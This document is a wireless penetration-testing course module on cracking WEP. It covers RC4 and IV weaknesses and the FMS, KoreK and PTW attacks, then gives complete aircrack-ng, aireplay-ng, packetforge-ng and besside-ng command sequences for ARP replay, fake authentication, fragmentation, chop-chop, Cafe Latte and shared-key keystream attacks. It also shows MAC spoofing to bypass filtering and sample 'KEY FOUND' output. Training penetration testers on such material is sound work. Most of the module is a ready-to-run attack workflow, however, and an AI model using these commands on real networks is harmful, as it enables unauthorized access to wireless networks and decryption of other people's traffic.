# Module 05 — WEP Cracking

> **Prerequisites:** [Module 04 — Packet Analysis with Wireshark & Scapy](../module-04-packet-analysis/)
> **Next Module:** [Module 06 — Capturing the WPA2 4-Way Handshake](../module-06-wpa2-handshake/)

---

## Table of Contents

1. [Why WEP Is Still Relevant](#1-why-wep-is-still-relevant)
2. [WEP Encryption Fundamentals](#2-wep-encryption-fundamentals)
3. [RC4 Key Scheduling Algorithm (KSA) — The Root Weakness](#3-rc4-key-scheduling-algorithm-ksa--the-root-weakness)
4. [WEP IV Weakness — Statistical Attack Foundation](#4-wep-iv-weakness--statistical-attack-foundation)
5. [The FMS Attack (Fluhrer-Mantin-Shamir)](#5-the-fms-attack-fluhrer-mantin-shamir)
6. [The PTW Attack (Pyshkin-Tews-Weinmann)](#6-the-ptw-attack-pyshkin-tews-weinmann)
7. [IV Count Requirements by Method](#7-iv-count-requirements-by-method)
8. [Cracking Methods Overview](#8-cracking-methods-overview)
9. [Method 1: Passive IV Collection](#9-method-1-passive-iv-collection)
10. [Method 2: ARP Replay Attack (Recommended)](#10-method-2-arp-replay-attack-recommended)
11. [Method 3: Fake Authentication](#11-method-3-fake-authentication)
12. [Method 4: Fragmentation Attack](#12-method-4-fragmentation-attack)
13. [Method 5: Chop-Chop Attack](#13-method-5-chop-chop-attack)
14. [Method 6: Cafe Latte Attack](#14-method-6-cafe-latte-attack)
15. [Shared Key Authentication Exploit](#15-shared-key-authentication-exploit)
16. [packetforge-ng — Building Custom Packets](#16-packetforge-ng--building-custom-packets)
17. [besside-ng — Automated WEP Cracking](#17-besside-ng--automated-wep-cracking)
18. [Full aircrack-ng Flag Reference for WEP](#18-full-aircrack-ng-flag-reference-for-wep)
19. [WEP in Wireshark](#19-wep-in-wireshark)
20. [Troubleshooting Common Issues](#20-troubleshooting-common-issues)
21. [Knowledge Check](#21-knowledge-check)

---

## 1. Why WEP Is Still Relevant

While WPA2/WPA3 are the current standards, **WEP is still encountered in the wild** because:

- Legacy hardware that cannot be upgraded (old routers, printers, IP cameras)
- Misconfigured or neglected deployments
- IoT devices and SCADA/ICS equipment with limited CPU
- Embedded systems (hospital monitoring, industrial control)
- CTF competitions and lab environments

**WEP can be cracked in under 60 seconds** with an ARP replay attack and enough captured IVs — making it a critical skill for penetration testers. Any WEP network discovered during an engagement is an immediate critical finding.

---

## 2. WEP Encryption Fundamentals

### RC4 Stream Cipher

WEP uses the **RC4** (Rivest Cipher 4) stream cipher:

```
Encryption:
  Step 1: 24-bit Initialization Vector (IV) randomly generated per packet
  Step 2: RC4 key = IV || WEP_secret_key  (concatenated)
  Step 3: RC4 KSA + PRGA → keystream
  Step 4: Plaintext XOR keystream → Ciphertext
  Step 5: Packet = IV (3 bytes, plaintext) || CRC-32 || Ciphertext

Decryption:
  Step 1: Read IV from packet header (it's in cleartext)
  Step 2: RC4 key = IV || WEP_secret_key
  Step 3: RC4 PRGA → same keystream
  Step 4: Ciphertext XOR keystream → Plaintext
  Step 5: Verify CRC-32
```

### WEP Key Structure

```
64-bit WEP:
  ├── 24-bit IV     (transmitted per-packet in cleartext)
  └── 40-bit secret key  (5 ASCII chars or 10 hex chars)

128-bit WEP:
  ├── 24-bit IV     (transmitted per-packet in cleartext)
  └── 104-bit secret key  (13 ASCII chars or 26 hex chars)
```

**Note:** The marketing names "64-bit" and "128-bit" are misleading. The actual secret key strength is only 40 or 104 bits. The 24-bit IV is regenerated per packet and sent in cleartext — it provides zero security.

### CRC-32 — A Broken Integrity Check

WEP uses CRC-32 (also called ICV — Integrity Check Value) to detect corruption:

```
ICV = CRC-32(plaintext)
Transmitted = IV || Encrypt(plaintext || ICV)
```

**CRC-32 is linear** — an attacker can flip a bit in the ciphertext and compute the corresponding CRC change without knowing the key. This enables:
- Bit-flip attacks (Chop-Chop)
- Forgery of new valid packets (packetforge-ng)

---

## 3. RC4 Key Scheduling Algorithm (KSA) — The Root Weakness

This is the mathematical foundation of why WEP is broken. The FMS attack exploits a specific weakness in how RC4 initializes its internal state.

### RC4 Algorithm

RC4 has two phases:

**Phase 1: KSA (Key Scheduling Algorithm)**
```python
# Initialize state array
S = list(range(256))   # S[0..255] = 0,1,2,...,255
j = 0
key = IV + secret_key  # This is the critical concatenation

for i in range(256):
    j = (j + S[i] + key[i % len(key)]) % 256
    S[i], S[j] = S[j], S[i]    # Swap
```

**Phase 2: PRGA (Pseudo-Random Generation Algorithm)**
```python
# Generate keystream bytes
i = 0; j = 0
while generating:
    i = (i + 1) % 256
    j = (j + S[i]) % 256
    S[i], S[j] = S[j], S[i]
    yield S[(S[i] + S[j]) % 256]   # Output keystream byte
```

### The Weak IV Problem

The KSA processes the concatenated `IV || key` byte by byte. When the IV has a specific structure — known as **"weak IVs"** — the first bytes of the keystream are **statistically correlated** with specific bytes of the secret key.

Specifically, IVs of the form `(A+3, 255, X)` where A is the key byte index cause a bias in the first output byte of the keystream — it correlates with `key[A]` with probability `2/256` instead of the expected `1/256`.

Collecting ~85,000 such weak IVs gives enough statistical data to recover each key byte independently.

---

## 4. WEP IV Weakness — Statistical Attack Foundation

### IV Space Exhaustion

With only 24 bits, the IV space is:
```
2^24 = 16,777,216 possible IVs
```

In a network transferring 1,500-byte packets at 11 Mbps:
```
Packets/second ≈ 900
Time to IV space exhaustion ≈ 16,777,216 / 900 ≈ 5.2 hours
```

But the **birthday paradox** means IV collisions start occurring much sooner — with only ~5,000 packets (probability ~75% of at least one collision).

### IV Reuse Attack

When two packets are encrypted with the same IV and key, they use the **identical keystream**:

```
C1 = P1 XOR K    (ciphertext 1 = plaintext 1 XOR keystream)
C2 = P2 XOR K    (ciphertext 2 = plaintext 2 XOR keystream)

C1 XOR C2 = P1 XOR P2   (XOR the ciphertexts → XOR of plaintexts)
```

If either plaintext is known (ARP headers, LLC/SNAP headers are predictable), the other plaintext is immediately recovered.

### Known Plaintext Available in WEP

The LLC/SNAP header is always present and always the same value:
```
LLC/SNAP: AA AA 03 00 00 00 08 00
```
This provides 8 bytes of known plaintext per packet — enough for the chopchop and fragmentation attacks.

---

## 5. The FMS Attack (Fluhrer-Mantin-Shamir)

Published in 2001, the FMS attack was the first practical WEP cracking method. It exploits the statistical correlation between weak IVs and secret key bytes.

### How It Works

1. **Collect packets** containing weak IVs of the form `(A+3, N, X)`
2. For each weak IV, record the first plaintext byte XOR'd with first keystream byte
3. The first keystream byte statistically reveals `key[A]`
4. Repeat for all key bytes A = 0, 1, 2, ..., (keylen-1)

### Required IVs

| Key Size | IVs Needed (FMS) | IVs Needed (PTW) |
|----------|-----------------|-----------------|
| 40-bit (64-bit WEP) | ~300,000 | ~20,000–40,000 |
| 104-bit (128-bit WEP) | ~1,000,000 | ~50,000–85,000 |

### KoreK Improvements

**KoreK** (2004) extended FMS with 17 additional statistical attacks on the RC4 KSA, reducing IV requirements by ~3x and working on all IVs (not just "weak" ones).

---

## 6. The PTW Attack (Pyshkin-Tews-Weinmann)

Published in 2007, PTW dramatically reduced the IV count needed — cracking 64-bit WEP with as few as **20,000 IVs** in under 1 second.

### Key Differences from FMS/KoreK

| Feature | FMS/KoreK | PTW |
|---------|-----------|-----|
| Uses all packets | No (weak IVs only) | **Yes (all packets used)** |
| Correlation analysis | Per key byte | **Full key simultaneously** |
| IV requirement | 300K–1M | **20K–85K** |
| Plaintext known needed | 1 byte (first) | **Full ARP (28 bytes)** |
| Speed | Minutes | **< 1 second** |

### How PTW Works

PTW uses a **corrected voting scheme** across all captured packets:

1. For each candidate key byte value (0–255), count "votes" from IVs
2. The candidate with the most votes is the most likely key byte
3. Repeat for all key bytes in order
4. The PTW paper showed that ARP packets (known structure) provide enough known plaintext to make this highly reliable

### Practical Usage

```bash
# PTW attack (flag -z)
aircrack-ng -z -n 64 wep_capture-01.cap
# -z       = use PTW attack
# -n 64    = key length in bits (64 or 128)

# PTW requires ARP packets in the capture
# If no ARPs → PTW will fail → fall back to KoreK (no -z flag)
```

---

## 7. IV Count Requirements by Method

| Method | Min IVs | Realistic Time | Key Bits |
|--------|---------|----------------|----------|
| Passive only (FMS) | ~300,000 | 2–8 hours | 64-bit |
| Passive only (KoreK) | ~100,000 | 30–90 min | 64-bit |
| ARP Replay (PTW) | ~20,000–40,000 | 2–5 min | 64-bit |
| ARP Replay (PTW) | ~50,000–85,000 | 5–15 min | 128-bit |
| Fragmentation + Replay | ~20,000 | 3–10 min | 64-bit |
| Chop-Chop + Replay | ~20,000 | 10–20 min | 64-bit |

**Monitor IVs collected:** The `#Data` column in airodump-ng shows total data frames. For IVs specifically, check the aircrack-ng output line:
```
1  AA:BB:CC:DD:EE:FF  MyAP     WEP (24,815 IVs)
```

---

## 8. Cracking Methods Overview

| Method | Speed | IVs/min | Prerequisites |
|--------|-------|---------|---------------|
| **ARP Replay** | **Fastest** | **~500–2000** | Active client or fake auth |
| Fragmentation | Fast | ~300–800 | Fake authentication to AP |
| Chop-Chop | Medium | ~100–300 | Some data traffic |
| Cafe Latte | Medium | ~100–200 | Client (not AP) |
| Passive only | Slow | Network dependent | Monitor mode only |

---

## 9. Method 1: Passive IV Collection

The simplest, most stealthy method — purely passive, no injection.

```bash
# Enable monitor mode
sudo airmon-ng check kill && sudo airmon-ng start wlan0

# Capture IVs to .cap file
sudo airodump-ng \
  --bssid AA:BB:CC:DD:EE:FF \   # Target AP
  -c 6 \                        # Target channel
  -w wep_passive \              # Output file prefix
  --output-format ivs \         # IVS format: smaller file, WEP IVs only
  wlan0mon
# --output-format ivs  → creates wep_passive-01.ivs (much smaller than .cap)
#                         Only IVs are stored, not full frames
#                         Trade-off: Wireshark can't read .ivs files

# Crack when enough IVs collected
sudo aircrack-ng wep_passive-01.ivs
# aircrack-ng reads .ivs directly — very fast loading
```

---

## 10. Method 2: ARP Replay Attack (Recommended)

The most reliable, fastest WEP cracking technique. Replays captured ARP packets to rapidly generate new IVs.

```bash
# Terminal 1: Targeted capture
sudo airodump-ng \
  --bssid AA:BB:CC:DD:EE:FF \
  -c 6 \
  -w wep_arp \
  --output-format pcap \
  wlan0mon

# Terminal 2: ARP replay
sudo aireplay-ng \
  --arpreplay \                      # -3 : ARP replay attack mode
  -b AA:BB:CC:DD:EE:FF \             # Target AP BSSID
  -h 11:22:33:44:55:66 \             # Your MAC (or authenticated client MAC)
  -x 1000 \                          # Inject 1000 packets/second (default: unlimited)
  -r wep_arp-01.cap \                # Optional: read ARPs from existing capture
  wlan0mon

# Flag breakdown:
# --arpreplay / -3  → wait for ARP packet, then replay it in a loop
# -b <BSSID>        → which AP to send replayed ARPs to
# -h <MAC>          → source MAC for injected frames (must be authenticated to AP)
# -x <pps>          → injection rate (packets per second); lower = less conspicuous
# -r <file>         → read ARP packets from a previous capture instead of waiting

# Terminal 3: Crack when #Data > 20,000
sudo aircrack-ng -z -n 64 wep_arp-01.cap
# -z      → PTW attack (fastest)
# -n 64   → 64-bit key (use -n 128 for 128-bit WEP)
```

### Successful Output

```
[00:01:35] Tested 1024 keys (got 24815 IVs)

KEY FOUND! [ 31:32:33:34:35 ] (ASCII: 12345)
Decrypted correctly: 100%
```

---

## 11. Method 3: Fake Authentication

Required when no clients are connected — you need an authenticated MAC to inject frames.

```bash
sudo aireplay-ng \
  --fakeauth 0 \                     # -1 0 : fake auth, send keep-alive every 0 seconds
  -a AA:BB:CC:DD:EE:FF \             # Target AP BSSID
  -e "TargetSSID" \                  # AP SSID (required for some APs)
  -h 11:22:33:44:55:66 \             # Your MAC address
  wlan0mon

# Flag breakdown:
# --fakeauth / -1  → fake authentication mode
# 0                → re-auth interval: 0 = send auth once (use 30 for persistent every 30s)
# -a <BSSID>       → target AP
# -e <SSID>        → SSID to authenticate to (needed for some APs that check SSID in auth)
# -h <MAC>         → MAC to authenticate with (use macchanger -r to randomize first)

# Successful output:
# 12:00:00  Sending Authentication Request (Open System)
# 12:00:00  Authentication successful!
# 12:00:00  Sending Association Request
# 12:00:00  Association successful :-)
```

### Troubleshooting Fake Auth Failures

| Error Message | Cause | Fix |
|---------------|-------|-----|
| `ACK timed out` | Too far from AP / TX power too low | Move closer; increase TX power |
| `Denied (code 10)` | MAC filtering enabled | Spoof a known-good client MAC (`-h <client_MAC>`) |
| `Wrong ESSID` | SSID mismatch | Add `-e "ExactSSID"` flag |
| `Got a deauthentication packet` | AP detected fake auth | Try with a spoofed client MAC |
| `OFL` | Out of frame limit | Wait for more beacons to sync |

### Persistent Fake Auth (for long sessions)

```bash
# Keep re-authenticating every 30 seconds
sudo aireplay-ng --fakeauth 30 -a AA:BB:CC:DD:EE:FF -h 11:22:33:44:55:66 wlan0mon
```

---

## 12. Method 4: Fragmentation Attack

Extracts 1,500 bytes of keystream from the AP — enough to forge new valid encrypted packets without knowing the WEP key.

```bash
# Step 1: Fake auth (must be authenticated)
sudo aireplay-ng --fakeauth 0 -a AA:BB:CC:DD:EE:FF -h 11:22:33:44:55:66 wlan0mon

# Step 2: Run fragmentation attack
sudo aireplay-ng \
  --fragment \                       # -5 : fragmentation attack
  -b AA:BB:CC:DD:EE:FF \             # Target AP
  -h 11:22:33:44:55:66 \             # Your authenticated MAC
  wlan0mon

# Flag breakdown:
# --fragment / -5  → fragmentation attack mode
# -b <BSSID>       → target AP BSSID
# -h <MAC>         → source MAC (must be authenticated)

# Successful output:
# Got a fragment!
# Saving keystream in fragment-XXXXXX.xor
# Now you can build a packet with packetforge-ng out of that 1500 byte keystream

# Step 3: Use recovered keystream to build ARP packet
sudo packetforge-ng \
  --arp \                    # Build an ARP request
  -a AA:BB:CC:DD:EE:FF \    # AP BSSID
  -h 11:22:33:44:55:66 \    # Source MAC
  -k 192.168.1.100 \        # Destination IP
  -l 192.168.1.1 \          # Source IP
  -y fragment-XXXXXX.xor \  # Keystream from fragmentation attack
  -w forged_arp.cap         # Output file

# Step 4: Replay the forged ARP to generate IVs
sudo aireplay-ng \
  --interactive \            # -2 : interactive packet replay
  -r forged_arp.cap \       # Use the forged ARP
  wlan0mon
```

---

## 13. Method 5: Chop-Chop Attack

Decrypts a WEP packet **byte by byte** by exploiting the linear CRC-32. Produces a keystream file usable with `packetforge-ng`.

```bash
sudo aireplay-ng \
  --chopchop \                       # -4 : chop-chop attack
  -b AA:BB:CC:DD:EE:FF \             # Target AP
  -h 11:22:33:44:55:66 \             # Your MAC
  -m 68 \                            # Minimum packet length to target (ARP = 68 bytes)
  -n 85 \                            # Maximum packet length to target
  -p 0841 \                          # Set frame control bytes (0x0841 = data frame from DS)
  wlan0mon

# Flag breakdown:
# --chopchop / -4  → chop-chop attack
# -b <BSSID>       → target AP
# -h <MAC>         → source MAC
# -m <len>         → only target packets ≥ N bytes
# -n <len>         → only target packets ≤ N bytes
# -p <FC>          → override Frame Control bytes (needed to match what AP expects)

# Output: replayed data-XXXXXX.xor (keystream) + replay_src-XXXXXX.cap

# Then forge and replay an ARP packet:
sudo packetforge-ng --arp \
  -a AA:BB:CC:DD:EE:FF -h 11:22:33:44:55:66 \
  -k 255.255.255.255 -l 255.255.255.255 \
  -y replay_dec-XXXXXX.xor -w chop_arp.cap

sudo aireplay-ng --interactive -r chop_arp.cap wlan0mon
```

---

## 14. Method 6: Cafe Latte Attack

Extracts a WEP key using **only the client** — no access to the AP needed. Useful when you're near clients but not the AP.

```bash
sudo aireplay-ng \
  --caffe-latte \                    # -6 : cafe latte attack
  -b AA:BB:CC:DD:EE:FF \             # Target BSSID (of AP client is connected to)
  -h 11:22:33:44:55:66 \             # Target client MAC
  wlan0mon

# Flag breakdown:
# --caffe-latte / -6  → cafe latte mode
# -b <BSSID>          → AP BSSID the client is associated with
# -h <client_MAC>     → target client's MAC (from airodump-ng station list)

# How it works:
# 1. Captures an ARP broadcast from the client
# 2. Bit-flips the IP destination to broadcast (255.255.255.255)
# 3. Re-encrypts and sends back to client
# 4. Client decrypts, detects invalid ARP, sends an ARP reply
# 5. This ARP reply has a new IV → collect enough for cracking
```

---

## 15. Shared Key Authentication Exploit

**Shared Key Authentication (SKA)** is the WEP "challenge-response" mode. It is actually *weaker* than Open System Authentication because it leaks the keystream directly.

### How SKA Works (and Why It's Exploitable)

```
Frame 1: Client → AP    Authentication Request (Open)
Frame 2: AP → Client    Challenge Text (128 bytes, plaintext)
Frame 3: Client → AP    Challenge Text encrypted with WEP key
Frame 4: AP → Client    Authentication Success/Failure
```

**The critical vulnerability:** Frame 2 (challenge, plaintext) and Frame 3 (challenge, encrypted) are both captured. XORing them recovers the keystream:

```
keystream = challenge_plaintext XOR challenge_ciphertext
```

This keystream can then be used with `packetforge-ng` to forge new valid WEP-encrypted frames **without ever knowing the WEP key**.

### Capturing SKA Keystream

```bash
# Capture an SKA exchange
sudo airodump-ng --bssid AA:BB:CC:DD:EE:FF -c 6 -w ska_capture wlan0mon

# Wait for or force a client to authenticate with SKA
# The capture automatically stores the keystream when SKA frames are detected

# aireplay-ng detects SKA and saves the keystream automatically:
# Saved 128 bytes of keystream in prga-XXXXXX.xor

# Use the keystream directly (no need to know the key):
sudo aireplay-ng --fakeauth 0 \
  -a AA:BB:CC:DD:EE:FF \
  -h YOUR_MAC \
  -y prga-XXXXXX.xor \           # Use captured SKA keystream instead of key
  wlan0mon
```

---

## 16. packetforge-ng — Building Custom Packets

`packetforge-ng` creates custom encrypted WEP packets using a known keystream. Used with fragmentation and chop-chop outputs.

```bash
# Build an ARP request
packetforge-ng \
  --arp \                      # Build ARP request
  -a AA:BB:CC:DD:EE:FF \      # AP BSSID (addr3)
  -h 11:22:33:44:55:66 \      # Source MAC
  -k 192.168.1.255 \          # Destination IP (broadcast)
  -l 192.168.1.100 \          # Source IP
  -y fragment-XXXXXX.xor \   # Keystream file
  -w arp_forged.cap            # Output .cap file

# Build a custom IP packet
packetforge-ng \
  --udp \                      # Build UDP packet
  -a AP_BSSID \
  -h CLIENT_MAC \
  -k DEST_IP \
  -l SOURCE_IP \
  -o 68 \                      # Destination port
  -0 68 \                      # Source port
  -y keystream.xor \
  -w udp_forged.cap

# Flag reference:
# --arp    → ARP request (most useful for WEP IV generation)
# --udp    → UDP packet
# --icmp   → ICMP packet
# --custom → Custom packet from file
# -a       → AP BSSID
# -h       → Source MAC
# -k       → Destination IP
# -l       → Source IP
# -y       → Keystream (.xor file from fragmentation/chopchop)
# -w       → Output file
```

---

## 17. besside-ng — Automated WEP Cracking

`besside-ng` automates the entire WEP attack chain in one command — monitor, scan, associate, replay, and crack.

```bash
# One-command WEP cracker (targets ALL WEP APs in range)
sudo besside-ng wlan0mon

# Target a specific AP
sudo besside-ng -b AA:BB:CC:DD:EE:FF wlan0mon

# Flag reference:
# -b <BSSID>   → target only this AP
# -c <channel> → only scan this channel
# -v           → verbose output
# -W           → only attack WEP networks (skip WPA)
# -R           → ignore WPA (useful in mixed environments)

# besside-ng creates:
# wpa.cap       → WPA handshakes (if any WPA found)
# wep.cap       → WEP traffic and cracked keys
# besside.log   → log with cracked keys

# Example successful log:
# [12:00:05] AP AA:BB:CC:DD:EE:FF MyAP WEP cracked: 1234567890
```

**Warning:** `besside-ng` is very noisy — it actively injects and deauths clients. Use only in authorized lab environments.

---

## 18. Full aircrack-ng Flag Reference for WEP

```bash
aircrack-ng [options] capture.cap

# Core crack flags:
# (no flag)   → KoreK attack (uses all packets)
# -z          → PTW attack (recommended; requires ARP packets)
# -K          → KoreK-only attack (force KoreK over PTW)

# Key configuration:
# -n <bits>   → WEP key length: 64 or 128 (default: try both)
# -c          → restrict to ASCII characters only
# -t          → restrict to hexadecimal characters

# Input filtering:
# -b <BSSID>  → only crack keys for this AP
# -e <ESSID>  → only crack keys for this SSID
# -d <mask>   → debug: assume first N bytes of key are known
#               e.g., -d 12:34 assumes key starts with 12:34

# Multi-file:
# -M <num>    → load at most N IVs from each .ivs file (reduce memory)
# -H          → display help

# Practical examples:
sudo aircrack-ng -z -n 64 capture-01.cap             # PTW, 64-bit
sudo aircrack-ng -z -n 128 capture-01.cap            # PTW, 128-bit
sudo aircrack-ng -n 64 -b AA:BB:CC:DD:EE:FF *.cap   # KoreK, all .cap files
sudo aircrack-ng *.ivs                               # KoreK from .ivs files
```

---

## 19. WEP in Wireshark

### Identifying WEP Traffic

```wireshark
# WEP-encrypted data frames (Protected bit = 1)
wlan.fc.type == 2 && wlan.fc.protected == 1

# Filter for WEP specifically (has ICV field)
# WEP frames have the old ICV/WEP header structure
wlan.wep.icv

# See the IV in the frame:
# Expand: IEEE 802.11 → WEP parameters → Initialization Vector
```

### Setting WEP Key in Wireshark for Decryption

```
Edit → Preferences → Protocols → IEEE 802.11
  → Decryption keys → Edit → Add (+)
  Key type: wep
  Key:      1234567890   (ASCII key, 5 or 13 chars)
  OR
  Key:      31:32:33:34:35  (hex format: each byte separated by colon)
```

After adding the key, apply filter `wlan.fc.type == 2` — you will see HTTP, DNS, ARP in plaintext.

---

## 20. Troubleshooting Common Issues

### Issue: ARP replay shows "Waiting for beacon" forever

```bash
# AP may be on a different channel
sudo iw dev wlan0mon set channel 6
# Re-run airodump-ng first to confirm channel
```

### Issue: `Got a deauthentication packet` during fake auth

```bash
# AP has MAC filtering — spoof a known-good client MAC
# Get a real client MAC from airodump-ng station list:
# STATION: 11:22:33:44:55:66 (connected to target AP)
sudo ip link set wlan0mon down
sudo macchanger -m 11:22:33:44:55:66 wlan0mon
sudo ip link set wlan0mon up
sudo aireplay-ng --fakeauth 0 -a AP_BSSID -h 11:22:33:44:55:66 wlan0mon
```

### Issue: PTW fails — "No valid WEP packets"

```bash
# PTW requires ARP packets. If no ARPs in capture:
# Option 1: Use KoreK instead (remove -z flag)
sudo aircrack-ng -n 64 capture-01.cap

# Option 2: Run longer to capture ARPs
# Option 3: Use fragmentation + packetforge-ng to create ARP packets
```

### Issue: Aircrack-ng keeps trying but can't find key

```bash
# Ensure enough IVs for the key size:
# 64-bit WEP:  need ~20,000 IVs (PTW) or ~100,000 (KoreK)
# 128-bit WEP: need ~80,000 IVs (PTW) or ~500,000 (KoreK)

# Check IV count:
aircrack-ng capture-01.cap
# Look for: "WEP (XXXXX IVs)"

# If too few → continue ARP replay longer
```

---

## 21. Knowledge Check

1. What is the size of the WEP Initialization Vector and how many unique IVs does this allow?
2. Why is `64-bit WEP` misleading in terms of actual key strength?
3. Explain the mathematical reason why IV reuse is fatal to WEP security (use XOR properties).
4. What is the core RC4 KSA weakness exploited by FMS and KoreK attacks?
5. How does PTW differ from FMS/KoreK in terms of: IVs required, packets used, and speed?
6. Write the complete 3-terminal command sequence to perform an ARP replay WEP attack.
7. What does `aircrack-ng -z -n 128` mean — break down each flag.
8. Explain why Shared Key Authentication (SKA) is *weaker* than Open System Authentication for WEP.
9. What is `packetforge-ng` used for and what does it require as input?
10. What does `besside-ng` automate and what files does it produce?
11. Why does Fake Authentication fail with error "Denied (code 10)" and how do you fix it?
12. What is the `--output-format ivs` flag for `airodump-ng` and what are its trade-offs?
13. How does the Cafe Latte attack work without access to the AP?
14. What Wireshark filter shows WEP-encrypted data frames? What field uniquely identifies a WEP frame?

---

**Next:** [Module 06 — Capturing the WPA2 4-Way Handshake](../module-06-wpa2-handshake/)
